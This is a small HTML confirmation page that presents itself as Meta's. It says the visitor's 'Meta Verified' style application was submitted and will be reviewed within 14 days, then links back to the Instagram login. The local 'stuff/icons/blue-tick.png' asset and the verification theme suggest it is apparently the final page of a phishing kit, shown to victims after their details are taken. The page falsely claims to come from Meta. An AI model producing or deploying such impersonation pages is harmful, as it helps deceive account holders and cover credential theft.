<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Application Submitted</title>
    <style>
        /* General body styles */
        body {
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            color: #333;
        }

        /* Logo styling */
        .logo {
            margin-bottom: 10px;
        }

        .logo img {
            height: 150px;
        }

        /* Message container styles */
        .message {
            text-align: center;
            background: #fff;
            padding: 30px 20px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 90%;
        }

        .message h1 {
            font-size: 24px;
            color: #333;
            margin-bottom: 10px;
        }

        .message p {
            font-size: 16px;
            color: #555;
            margin-bottom: 20px;
            line-height: 1.5;
        }

        /* Link styles */
        .link {
            color: #007bff;
            text-decoration: none;
            font-size: 14px;
            font-weight: bold;
            transition: color 0.3s ease;
        }

        .link:hover {
            color: #0056b3;
            text-decoration: underline;
        }

        /* Footer styles */
        footer {
            margin-top: 20px;
            font-size: 12px;
            color: #666;
            text-align: center;
        }

        footer a {
            color: #007bff;
            text-decoration: none;
            transition: color 0.3s ease;
        }

        footer a:hover {
            color: #0056b3;
            text-decoration: underline;
        }

        /* Responsive adjustments */
        @media (max-width: 600px) {
            .message h1 {
                font-size: 20px;
            }

            .message p {
                font-size: 14px;
            }

            .link {
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
    <!-- Logo -->
    <div class="logo">
        <img src="stuff/icons/blue-tick.png" alt="Meta Logo">
    </div>

    <!-- Message container -->
    <div class="message">
        <h1>Thanks! Application Submitted</h1>
        <p>Your account has been submitted for review. You will be notified by the Meta team within 14 days.</p>
        <a href="https://www.instagram.com/accounts/login/" class="link">Back to Home</a>
    </div>

    <!-- Footer -->
    <footer>
        &copy; Meta 2025 &middot; <a href="https://about.meta.com/technologies/meta-verified/" class="link">Help</a>
    </footer>
</body>
</html>
